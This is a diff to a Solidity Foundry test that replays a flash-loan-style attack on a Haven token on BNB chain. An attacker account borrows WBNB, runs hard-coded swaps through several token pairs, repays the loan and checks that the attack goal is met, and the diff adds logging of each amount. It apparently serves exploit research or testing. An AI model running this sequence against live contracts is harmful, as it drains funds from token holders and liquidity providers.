@@ -360,16 +360,26 @@ contract HavenTestBase is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 0x6f05b59d3b20000);
         borrow_wbnb_owner(0x6f05b59d3b20000);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", 1);
+        emit log_named_uint("amt2", 1);
         swap_pairhw_haven_haven_wbnb(1, 1);
         printBalance("After step1 ");
+        emit log_named_uint("amt3", 0xde0b6b3a764000);
+        emit log_named_uint("amt4", 0x10d9e630e3b);
         swap_pairhw_attacker_wbnb_haven(0xde0b6b3a764000, 0x10d9e630e3b);
         printBalance("After step2 ");
+        emit log_named_uint("amt5", 0xea7bb7545d);
+        emit log_named_uint("amt6", 0xe54f93491895b800);
         swap_pairbh_attacker_haven_busd(0xea7bb7545d, 0xe54f93491895b800);
         printBalance("After step3 ");
+        emit log_named_uint("amt7", 0xe54f93491895b800);
+        emit log_named_uint("amt8", 0xe4fbc69449f200);
         swap_pairbw_attacker_busd_wbnb(0xe54f93491895b800, 0xe4fbc69449f200);
         printBalance("After step4 ");
+        emit log_named_uint("amt9", (0x6f05b59d3b20000 * 1003) / 1000);
         payback_wbnb_owner((0x6f05b59d3b20000 * 1003) / 1000);
         printBalance("After step5 ");
         require(attackGoal(), "Attack failed!");
@@ -396,7 +406,7 @@ contract HavenTestBase is Test, BlockLoader {
         swap_pairbh_attacker_haven_busd(amt5, amt6);
         swap_pairbw_attacker_busd_wbnb(amt7, amt8);
         payback_wbnb_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
